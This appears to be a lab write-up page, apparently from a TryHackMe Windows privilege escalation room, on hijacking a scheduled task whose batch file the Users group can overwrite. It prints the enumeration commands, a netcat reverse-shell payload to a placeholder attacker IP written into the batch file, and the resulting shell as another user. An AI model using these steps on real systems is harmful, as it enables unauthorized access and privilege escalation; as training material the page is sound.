---
sidebar_position: 2
title: Scheduled Tasks
---


- Retrieving the **Scheduled Tasks** on the System. If our Current User can **Modify or Overwrite** <b style={{ color: 'Brown' }}>[Task to Run]</b> Executable we can Control what gets Executed by the User.
- <b style={{ color: 'Brown' }}>[Task to Run]</b> Indicates what gets Executed by the <span style={{fontWeight: 'Bold'}}>Scheduled Task</span> 
- <b style={{ color: 'Brown' }}>[Run as User]</b> Indicates the <span style={{fontWeight: 'Bold'}}>User</span> that will be used to Execute the Task.

```log
C:\> schtasks /query /tn vulntask /fo list /v
Folder: \
HostName:                             THM-PC1
TaskName:                             \vulntask
Task To Run:                          C:\tasks\schtask.bat
Run As User:                          taskusr1
```

<br/>

- The Group <b style={{ color: 'DeepSkyBlue' }}>BUILTIN\\Users:(I)(F)</b> has Full Access on the <span style={{fontWeight: 'Bold'}}>Binary.</span>

```log
C:\> icacls c:\tasks\schtask.bat
C:\tasks\schtask.bat NT AUTHORITY\SYSTEM:(I)(F)
                    BUILTIN\Administrators:(I)(F)
                    BUILTIN\Users:(I)(F)
```

<br/>

- Replacing the Contents of the <b style={{ color: 'Plum' }}>.bat</b> File with our <span style={{fontWeight: 'Bold'}}>PAYLOAD</span>

```log
C:\> echo c:\tools\nc64.exe -e cmd.exe $ATTACKER_IP $PORT > C:\tasks\schtask.bat
```

<br/>

- Starting the <b style={{ color: 'MediumTurquoise' }}>Task</b> **[In a Normal case Scenario we would have to Wait for the Task to be Started]**

```log
C:\> schtasks /run /tn vulntask
SUCCESS: Attempted to run Scheduled Task "vulntask"
```

```bash
attacker@machine:~$ nc -lvp 4444
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
wprivesc1\taskusr1
```